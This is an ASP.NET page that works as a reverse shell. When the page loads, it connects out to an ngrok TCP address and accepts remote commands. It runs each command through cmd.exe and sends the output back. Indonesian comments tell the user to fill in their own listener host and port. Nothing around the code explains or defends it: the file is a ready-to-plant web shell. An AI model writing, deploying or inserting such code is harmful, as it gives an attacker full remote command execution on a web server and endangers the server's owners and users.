<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string lhost = "0.tcp.ap.ngrok.io"; // Ganti dengan listener IP
        int lport = 18917; // Ganti dengan port listener

        try
        {
            using (TcpClient client = new TcpClient())
            {
                client.Connect(lhost, lport);
                using (NetworkStream stream = client.GetStream())
                {
                    byte[] successMsg = Encoding.ASCII.GetBytes("Reverse shell connected successfully!\n");
                    stream.Write(successMsg, 0, successMsg.Length);

                    using (System.IO.StreamReader reader = new System.IO.StreamReader(stream))
                    using (System.IO.StreamWriter writer = new System.IO.StreamWriter(stream))
                    {
                        writer.AutoFlush = true;
                        StringBuilder output = new StringBuilder();
                        while (true)
                        {
                            writer.Write("cmd> ");
                            string cmd = reader.ReadLine();
                            if (cmd.ToLower() == "exit") break;

                            System.Diagnostics.Process proc = new System.Diagnostics.Process();
                            proc.StartInfo.FileName = "cmd.exe";
                            proc.StartInfo.Arguments = "/c " + cmd;
                            proc.StartInfo.RedirectStandardOutput = true;
                            proc.StartInfo.RedirectStandardError = true;
                            proc.StartInfo.UseShellExecute = false;
                            proc.StartInfo.CreateNoWindow = true;
                            proc.Start();

                            string result = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
                            writer.WriteLine(result);
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            try
            {
                using (TcpClient failClient = new TcpClient(lhost, lport))
                using (NetworkStream failStream = failClient.GetStream())
                {
                    byte[] failMsg = Encoding.ASCII.GetBytes("[FAIL] Reverse shell connection failed: " + ex.Message + "\n");
                    failStream.Write(failMsg, 0, failMsg.Length);
                }
            }
            catch { /* swallow silently */ }
        }
    }
</script>
